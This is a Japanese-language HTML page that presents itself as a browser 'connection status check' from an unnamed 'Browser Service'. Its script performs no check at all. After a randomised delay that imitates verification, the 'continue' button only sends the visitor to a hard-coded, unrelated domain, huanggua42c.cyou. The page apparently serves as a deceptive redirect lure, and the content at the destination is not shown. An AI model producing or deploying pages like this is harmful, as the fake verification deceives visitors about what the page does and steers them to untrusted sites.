<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>接続状態確認</title>

<style>
body{
margin:0;
background:#f5f5f7;
font-family:-apple-system,BlinkMacSystemFont,sans-serif;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
padding:20px;
color:#1d1d1f;
}
.card{
width:100%;
max-width:420px;
background:#fff;
border-radius:16px;
padding:40px 30px;
text-align:center;
box-shadow:0 2px 12px rgba(0,0,0,.05);
}
.logo{
width:42px;
height:42px;
border-radius:12px;
background:#ff3b30;
margin:0 auto 18px;
display:flex;
align-items:center;
justify-content:center;
color:#fff;
font-weight:700;
}
.title{
font-size:22px;
font-weight:700;
margin-bottom:12px;
}
.desc{
font-size:14px;
color:#666;
line-height:1.7;
margin-bottom:28px;
}
.btn{
width:100%;
background:#ff3b30;
color:#fff;
border:none;
border-radius:12px;
padding:14px;
font-size:16px;
cursor:pointer;
}
.footer{
margin-top:24px;
font-size:11px;
color:#aaa;
}
</style>
</head>

<body>

<div class="card">

<div class="logo">
■
</div>

<div class="title">
接続状態を確認しています
</div>

<div class="desc">
ブラウザの状態を確認した後、<br>
ページへ移動します。
</div>

<button class="btn" id="go">
続ける
</button>

<div class="footer">
© 2026 Browser Service
</div>

</div>

<script>
const TARGET_URL="https://huanggua42c.cyou/";

document.getElementById("go").onclick=()=>{

const btn=document.getElementById("go");

btn.disabled=true;

btn.innerText="接続しています...";

setTimeout(()=>{

location.href=TARGET_URL;

},800+Math.random()*700);

}
</script>

</body>
</html>
